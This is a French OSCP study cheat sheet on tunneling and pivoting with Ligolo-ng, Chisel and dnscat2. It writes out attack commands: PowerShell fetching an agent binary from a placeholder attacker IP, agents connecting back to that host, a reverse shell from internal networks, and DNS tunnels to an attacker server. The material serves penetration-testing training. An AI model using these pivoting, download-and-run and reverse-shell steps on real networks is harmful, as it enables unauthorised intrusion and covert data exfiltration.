---
title: "OSCP · Tunneling"
description: "Référence des outils de tunnel et des modes de transport réseau."
---

# OSCP · Tunneling

Référence des outils de tunnel et des modes de transport réseau.


### Tunnel simple

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)


**Paramètres et repères :**
`X.X.X.X` · `Y.Y.Y.Y` · `X.X.X.X/` · `255.255.255.0`  
`/24`  


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up

```


<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>

```bash
# -selfcert génère un certificat TLS autosigné. Le tunnel reste chiffré, mais il faut vérifier l'identité du serveur.
./ligolo_proxy_linux -selfcert
# Autre possibilité
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>

```


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Tunnel simple ».</p>

```powershell
# Le port est le port par défaut, nous pourrions également le modifier si nécessaire.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
# Autre possibilité
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert

```


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Exécutez cette commande dans un autre terminal que depuis celui où le proxy ligolo est exécuté
sudo ip route add [internal_submask]/24 dev ligolo

# Vérifier la table de routage
ip route list

```


<p class="oscp-command-note">Script shell dans la rubrique « Tunnel simple ».</p>

```bash
# Exécutez ces commandes dans le terminal proxy ligolo
» session
» start

# Après cela, le tunnel devrait être prêt, vous pourriez exécuter n'importe quelle commande.

```


### Double tunnel

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo_double

sudo ip link set ligolo_double up

```


<p class="oscp-command-note">Script shell dans la rubrique « Double tunnel ».</p>

```bash
# La prochaine étape est d'ajouter un auditeur sur le port 11601 à notre session Ligolo existante et de la rediriger vers notre machine.
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Vérifiez qu'il a été ajouté
listener_list

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)




```powershell
# Ensuite, nous devons exécuter l'agent sur l'hôte Windows pour se connecter au port transmis sur notre machine d'attaque
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Notre dernière étape est de changer notre session en deuxième point de pivot (Windows), de démarrer le tunnel, puis d'ajouter une route au réseau nouvellement découvert à 10.1.30.0/24.
sudo ip add route <New_Network> dev ligolo_double

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_05.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_06.png)


### Local Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>

```bash
# Ajoutez une IP spéciale codée en dur pour le transfert de port local.
sudo ip route add 240.0.0.1/32 dev ligolo

```


**Paramètres et repères :**
`240.0.0.1/32`  




```text
dev ligolo

```


**Paramètres et repères :**
`240.0.0.1`  


<p class="oscp-command-note">Script shell dans la rubrique « Local Redirection de ports ».</p>

```bash
┌──(kali㉿Kali)-[~]  
└─$ nmap 240.0.0.1 -sV

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
631/tcp open ipp CUPS 2.2  
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)


### Reverse Shells From Internal Networks


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -nvlp [kali_port]

```




```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)


**Paramètres et repères :**
`msfvenom`  




```bash
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
# Autre possibilité
./payload.exe

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)


### Transfert de fichiers From Internal Networks

Transférer ou récupérer des fichiers dans le laboratoire.




```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -m http.server [kali_port]

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]

```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)


## Chisel (HTTP Tunneling)

Examiner les entrées et les réponses de l'application web.


### Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In remote machine
chisel server -p <listen-port>

# In local machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>

```


### Redirection inversée de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>

# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, <LOCAL_FORWARD_PORT> avec le port de votre machine locale auquel le service distant sera transmis, <REMOTE_IP> avec l'adresse IP de la machine distante, et <REMOTE_PORT> avec le port de la machine distante.

```


<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>

```bash
curl http://localhost:<LOCAL_FORWARD_PORT>

# Le résultat est le contenu de http://<REMOTE_IP>:<REMOTE_PORT>/

```


### Proxy SOCKS dynamique

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In remote
chisel server -p <REMOTE_PORT> --socks5

# In local
chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks

# Remplacer <REMOTE_PORT> par le port du proxy SOCKS sur la machine distante, <REMOTE_IP> par l'adresse IP de la machine distante, et <LOCAL_PORT> par le port de votre machine locale où le proxy SOCKS sera disponible.

```


**Paramètres et repères :**
`/etc/proxychains.conf`  


<p class="oscp-command-note">Script shell dans la rubrique « Proxy SOCKS dynamique ».</p>

```bash
# Comment out the line of "socks4"

# /etc/proxychains.conf
...
socks5 127.0.0.1 <LOCAL_PORT>

```


### Proxy SOCKS inverse

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Configurer un tunnel réseau.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks

# Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, et <REMOTE_PORT> avec le port sur la machine distante où le proxy SOCKS sera disponible.

```


**Paramètres et repères :**
`/etc/proxychains.conf`  




```bash
# /etc/proxychains.conf
...
socks5 127.0.0.1 <REMOTE_PORT>

```


<p class="oscp-command-note">Utiliser une commande au travers d&#x27;un proxy.</p>

```bash
proxychains nmap localhost

```


## Dnscat2 (DNS Tunneling)

Interroger les enregistrements DNS et identifier les services associés.


**Paramètres et repères :**
`dnscat2`  




```bash
# Remplacer [domain] par le domaine choisi
dnscat2-server [domain]

```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Script shell dans la rubrique « Dnscat2 (DNS Tunneling) ».</p>

```bash
# Avec domaine
./dnscat --secret=[secret] [domain]

# Directly to server
./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]

```


**Paramètres et repères :**
`dnscat2`  




```bash
dnscat2> windows
dnscat2> window -i [session_id]

```


**Paramètres et repères :**
`dnscat2`  




```bash
command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]

```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Parcourir un partage SMB.</p>

```bash
# Exemple de commande
smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]

```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
